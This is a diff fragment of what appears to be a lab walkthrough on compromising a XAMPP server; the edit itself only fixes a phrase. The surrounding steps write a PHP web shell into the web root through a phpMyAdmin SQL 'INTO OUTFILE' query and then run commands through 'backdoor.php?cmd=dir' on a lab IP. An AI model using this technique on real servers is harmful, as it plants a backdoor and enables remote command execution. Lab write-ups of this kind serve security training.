@@ -18,7 +18,7 @@ After this our server is ready to be compromised.
 2. Go to phpMyAdmin,
 3. Create new databse,
 4. Execute SQL Query: SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “C:\\xampp\\htdocs\\backdoor.php” !!Remeber to chane "'" sings
-to new one. Because of different encoding it can cause error.
+to the new one. Because of different encoding it can cause error.
 5. Now we created a new php file in main directory where HTTP resources are stored.
 6. Like we can see "http://10.0.2.10/backdoor.php" exist, now we can interact with victim machine.
 7. http://10.0.2.10/backdoor.php?cmd=dir will list the content of directory where PHP shell is stored.
